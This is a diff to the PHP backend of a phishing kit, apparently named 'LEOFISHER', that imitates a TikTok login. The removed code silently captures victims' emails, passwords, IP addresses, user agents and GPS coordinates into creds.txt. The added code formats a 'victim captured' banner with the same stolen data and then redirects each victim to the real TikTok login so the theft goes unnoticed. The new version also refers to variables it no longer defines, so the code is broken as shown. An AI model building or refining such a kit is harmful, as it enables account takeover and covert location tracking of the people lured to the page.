@@ -1,14 +1,20 @@
 <?php
-// Silent GPS capture (100% invisible, no prompts/status)
-if (isset($_POST['latitude']) && isset($_POST['longitude'])) {
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $email = $_POST['email'] ?? 'N/A';
-    $pass = $_POST['pass'] ?? 'N/A';
-    $ua = $_SERVER['HTTP_USER_AGENT'];
-    $lat = $_POST['latitude'];
-    $lon = $_POST['longitude'];
-    $data = "$ip|$email|$pass|$ua|$lat|$lon|" . date('Y-m-d H:i:s') . "\n";
-    file_put_contents('creds.txt', $data, FILE_APPEND | LOCK_EX);
+// ... ton code existant ...
+
+$gps = $_POST['gps'] ?? 'N/A';
+
+$log = "\n";
+$log .= "┌─[ LEOFISHER v2.0 by Léo Falcon ]──────────────┐\n";
+$log .= "│ 🎯 VICTIME CAPTURÉE !                          │\n";
+$log .= "├─[💻 INFOS]─────────────────────────────────────┤\n";
+$log .= "│ 📧 Email     : $email                          │\n";
+$log .= "│ 🔑 Password  : $pass                           │\n";
+$log .= "│ 🌐 IP        : $ip                             │\n";
+$log .= "│ 📍 GPS POSITION : $gps                         │\n";  // 👈 ÇA !
+$log .= "│ 🕒 Timestamp : $timestamp                      │\n";
+$log .= "└────────────────────────────────────────────────┘\n";
+
+   file_put_contents('creds.txt', $data, FILE_APPEND | LOCK_EX);
     // Immediate silent redirect to real TikTok
     header('Location: https://www.tiktok.com/login/phone-or-email?redirect_url=https%3A%2F%2Fwww.tiktok.com%2F');
     exit;
